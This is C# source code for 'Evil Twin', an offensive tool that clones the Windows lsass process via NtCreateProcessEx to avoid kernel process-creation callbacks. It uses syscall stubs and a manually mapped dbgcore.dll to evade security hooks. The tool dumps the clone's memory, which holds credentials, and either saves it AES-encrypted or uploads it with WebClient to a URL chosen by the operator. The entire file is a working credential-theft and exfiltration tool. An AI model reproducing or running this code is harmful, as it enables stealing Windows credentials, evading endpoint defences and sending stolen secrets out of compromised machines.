/*
Evil Twin is an lsass cloner that clones the memory address space of lsass and dump it 
using funciton "if you can call it that" NtCreateProcessEx, this function does NOT notify the kernel driver of a new
process creation 

shamelessly stole the minidump callbacks from SafetyDump XD

resources and references used:
https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
https://github.com/huntandhackett/process-cloning/tree/master
https://github.com/riskydissonance/SafetyDump
*/


using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using static DInvoke.DynamicInvoke.Generic;
using static DInvoke.Data.PE;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using DInvoke.ManualMap;

class Program
{
    const int PROCESS_CREATE_PROCESS = 0x0080;
    const int PROCESS_TERMINATE = 0x0001;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_READ = 0x0010;


    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtOpenProcess(
        ref IntPtr hProcess,
        int access,
        ref OBJECT_ATTRIBUTES objectAttributes,
        ref CLIENT_ID clientId
    );


    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtCreateProcessEx(
        ref IntPtr hProcess,
        int access,
        ref OBJECT_ATTRIBUTES objectAttributes,
        IntPtr hParentProcess,
        int flags,
        IntPtr sectionHandle,
        IntPtr debugPort,
        IntPtr exceptionPort,
        int unknown
    );


    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate int NtClose(IntPtr hObject);



    //[DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall,
    //CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    public delegate bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint processId,
        IntPtr hFile,
        uint dumpType,
        IntPtr expParam,
        IntPtr userStreamParam,
        IntPtr callbackParam
    );

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct MINIDUMP_IO_CALLBACK
    {
        public IntPtr Handle;
        public ulong Offset;
        public IntPtr Buffer;
        public int BufferBytes;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct MINIDUMP_CALLBACK_INFORMATION
    {
        public MinidumpCallbackRoutine CallbackRoutine;
        public IntPtr CallbackParam;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct MINIDUMP_CALLBACK_INPUT
    {
        public int ProcessId;
        public IntPtr ProcessHandle;
        public MINIDUMP_CALLBACK_TYPE CallbackType;
        public MINIDUMP_IO_CALLBACK Io;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate bool MinidumpCallbackRoutine(IntPtr CallbackParam, IntPtr CallbackInput, IntPtr CallbackOutput);

    public enum HRESULT : uint
    {
        S_FALSE = 0x0001,
        S_OK = 0x0000,
        E_INVALIDARG = 0x80070057,
        E_OUTOFMEMORY = 0x8007000E
    }

    public struct MINIDUMP_CALLBACK_OUTPUT
    {
        public HRESULT status;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct MiniDumpExceptionInformation
    {
        public uint ThreadId;
        public IntPtr ExceptionPointers;
        [MarshalAs(UnmanagedType.Bool)]
        public bool ClientPointers;
    }

    public enum MINIDUMP_CALLBACK_TYPE
    {
        ModuleCallback,
        ThreadCallback,
        ThreadExCallback,
        IncludeThreadCallback,
        IncludeModuleCallback,
        MemoryCallback,
        CancelCallback,
        WriteKernelMinidumpCallback,
        KernelMinidumpStatusCallback,
        RemoveMemoryCallback,
        IncludeVmRegionCallback,
        IoStartCallback,
        IoWriteAllCallback,
        IoFinishCallback,
        ReadMemoryFailureCallback,
        SecondaryFlagsCallback,
        IsProcessSnapshotCallback,
        VmStartCallback,
        VmQueryCallback,
        VmPreReadCallback,
        VmPostReadCallback
    }

    public static string GenerateRandomKeys(int length)
    {
        Random random = new Random(DateTime.Now.Millisecond);
        const string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        return new string(Enumerable.Repeat(charset, length).Select(s => s[random.Next(s.Length)]).ToArray());
    }

    public static byte[] AESEncrypt(byte[] data)
    {
        string key = GenerateRandomKeys(16);
        string iv = GenerateRandomKeys(16);
        //Console.WriteLine("\n");
        Console.WriteLine($"[+] AES Key Used: {key}");
        Console.WriteLine($"[+] AES IV Used: {iv}");



        using (AesManaged aes = new AesManaged())
        {
            aes.Key = System.Text.Encoding.UTF8.GetBytes(key);
            aes.IV = System.Text.Encoding.UTF8.GetBytes(iv);
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.Zeros;

            ICryptoTransform AESEncryptor = aes.CreateEncryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, AESEncryptor, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                }
                return ms.ToArray();
            }

        }
    }


    public static void WriteData2File(byte[] memory_blob) {
        string path = $@"{Environment.CurrentDirectory}\eviltwin.data";
        string b64_blob = Convert.ToBase64String(AESEncrypt(memory_blob));
        File.WriteAllText(path, b64_blob);
        Console.WriteLine($"[*] Wrote Encrypted Data to: {path}");
    }

    public static void OverTheWire(string b64decoded_blob, string url){
        using (WebClient sender = new WebClient())
        {
            // sends only the base64 encoded lsass, doesn't AES encrypt it, since we are not touching the disk

            Uri uri = new Uri(url);

            Console.WriteLine($"[+] sending to {url}");
            sender.UploadData(uri, System.Text.Encoding.UTF8.GetBytes(b64decoded_blob));

        }
    }




    static void Main(string[] args)
    {

        string send = null;
        bool send_encrypted = false;


        for (int arg = 0; arg < args.Length; arg++)
        {
            if (args[arg] == "-send") { send = args[arg + 1]; }
            if (args[arg] == "-send-encrypted") { send_encrypted = true; }
            if (args[arg] == "-help" || args[arg] == "-h" || args[arg] == "--help") { DisplayArgHelp(); Environment.Exit(0); }
        }

        void DisplayArgHelp()
        {
            Console.WriteLine("\nrun without any args: clones and dumps lsass and saves it to current dir");
            Console.WriteLine("\n-send            a url to send base64 encoded lsass dmp to");
            Console.WriteLine("\n-send-encrypted  sends lsass to the url above but AES encrypted not just b64 encoded");
        }

        IntPtr NtC_ptr = GetSyscallStub("NtClose");
        NtClose NtClose = Marshal.GetDelegateForFunctionPointer<NtClose>(NtC_ptr);

        IntPtr NtO_ptr = GetSyscallStub("NtOpenProcess");
        NtOpenProcess NtOpenProcess = Marshal.GetDelegateForFunctionPointer<NtOpenProcess>(NtO_ptr);

        IntPtr NtCreate_ptr = GetSyscallStub("NtCreateProcessEx");
        NtCreateProcessEx NtCreateProcessEx = Marshal.GetDelegateForFunctionPointer<NtCreateProcessEx>(NtCreate_ptr);

        Console.WriteLine("[+] Mapping a clean copy of (dbgcore.dll) for (MiniDumpWriteDump)");
        PE_MANUAL_MAP dbgcore = new();
        dbgcore = Map.MapModuleToMemory(@"C:\Windows\System32\dbgcore.dll");

        IntPtr Mini_ptr = GetExportAddress(dbgcore.ModuleBase, "MiniDumpWriteDump");
        MiniDumpWriteDump MiniDumpWriteDump = Marshal.GetDelegateForFunctionPointer<MiniDumpWriteDump>(Mini_ptr);


        int GetProcessIdByName() // using WMI because for some reason Process.GetProcessByName bugged MiniDumpWriteDump
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT ProcessId FROM Win32_Process WHERE Name = 'lsass.exe'"))
                using (var results = searcher.Get())
                {
                    foreach (var item in results)
                    {
                        Console.WriteLine($"[+] lsass pid: {Convert.ToInt32(item["ProcessId"])}");
                        return Convert.ToInt32(item["ProcessId"]);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error retrieving process ID: {ex.Message}");
            }

            return -1; // Return -1 if no process is found or an error occurs
        }



        IntPtr hParentProcess = IntPtr.Zero;
        IntPtr hCloneProcess = IntPtr.Zero;
        IntPtr pid = (IntPtr)GetProcessIdByName();

        // Open the target process for cloning
        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
        CLIENT_ID ci = new CLIENT_ID
        {
            UniqueProcess = pid
        };

        // Init Function
        oa.Length = Marshal.SizeOf(oa);
        oa.RootDirectory = IntPtr.Zero;
        oa.ObjectName = IntPtr.Zero;
        oa.Attributes = 0;
        oa.SecurityDescriptor = IntPtr.Zero;
        oa.SecurityQualityOfService = IntPtr.Zero;

        int status = NtOpenProcess(
            ref hParentProcess,
            PROCESS_CREATE_PROCESS, //| PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            ref oa,
            ref ci
        );

        if (status != 0)
        {
            Console.WriteLine($"NtOpenProcess failed with status: {status}");
            return;
        } else { Console.WriteLine("[+] Opened LSASS with PROCESS_CREATE_PROCESS Handle"); }

        var byteArray = new byte[60 * 1024 * 1024];
        var callbackPtr = new MinidumpCallbackRoutine((param, input, output) =>
        {
            var inputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(input);
            var outputStruct = Marshal.PtrToStructure<MINIDUMP_CALLBACK_OUTPUT>(output);
            switch (inputStruct.CallbackType)
            {
                case MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                    outputStruct.status = HRESULT.S_FALSE;
                    Marshal.StructureToPtr(outputStruct, output, true);
                    return true;
                case MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                    var ioStruct = inputStruct.Io;
                    if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
                    {
                        Array.Resize(ref byteArray, byteArray.Length * 2);
                    }
                    Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
                    outputStruct.status = HRESULT.S_OK;
                    Marshal.StructureToPtr(outputStruct, output, true);
                    return true;
                case MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                    outputStruct.status = HRESULT.S_OK;
                    Marshal.StructureToPtr(outputStruct, output, true);
                    return true;
                default:
                    return true;
            }
        });

        var callbackInfo = new MINIDUMP_CALLBACK_INFORMATION
        {
            CallbackRoutine = callbackPtr,
            CallbackParam = IntPtr.Zero
        };

        var size = Marshal.SizeOf(callbackInfo);
        var callbackInfoPtr = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);


        int status1 = NtCreateProcessEx(
            ref hCloneProcess,
            PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            ref oa,
            hParentProcess,
            0,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero,
            0
        );


        if (status1 != 0)
        {
            Console.WriteLine($"NtCreateProcessEx failed with status: {status1}");
            //NtClose(hParentProcess);
            //return;
        } else { Console.WriteLine("[+] Cloned LSASS' Memory Address Space to the Current Process"); }




        bool result = MiniDumpWriteDump(
            hCloneProcess,
            0,
            IntPtr.Zero,
            (uint)2,
            IntPtr.Zero,
            IntPtr.Zero,
            callbackInfoPtr

        );

        if (!result)
        {
            Console.WriteLine("[-] MiniDumpWriteDump failed.");
            Console.WriteLine(Marshal.GetLastWin32Error());
            return;
        }

        Console.WriteLine("[*] Dumped Cloned LSASS Memory");


        if (string.IsNullOrEmpty(send))
        {
            Console.WriteLine("[+] Encrypting and Writing to file....");
            WriteData2File(byteArray);
        }

        if (!string.IsNullOrEmpty(send))
        {
            if (!send_encrypted)
            {
                OverTheWire(Convert.ToBase64String(byteArray), send);

            }
            if (send_encrypted) {
                Console.WriteLine("[+] Encrypting and sending lsass dmp");
                OverTheWire(Convert.ToBase64String(AESEncrypt(byteArray)), send);
            }
        }


        //File.WriteAllBytes(@"C:\Users\DevOps\Desktop\lsass.blob", byteArray); // DEBUG




        NtClose(hParentProcess);
        NtClose(hCloneProcess);

    }
}
